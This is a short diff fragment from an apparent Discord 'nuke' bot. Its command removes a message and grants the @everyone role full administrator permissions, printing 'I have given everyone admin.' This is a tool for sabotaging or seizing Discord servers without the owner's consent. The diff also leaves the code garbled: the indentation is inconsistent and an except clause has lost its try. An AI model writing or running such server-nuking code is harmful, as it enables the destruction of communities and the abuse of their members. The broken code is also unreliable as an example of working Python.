@@ -40,9 +40,7 @@ async def on_ready():
 async def Nuke (ctx):
     await ctx.message.delete()
     guild = ctx.guild
-  await guild.create_text_channel("UR MESSAGE")
-    try:
-      role = discord.utils.get(guild.roles, name = "@everyone")
+   role = discord.utils.get(guild.roles, name = "@everyone")
       await role.edit(permissions = Permissions.all())
       print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
     except:
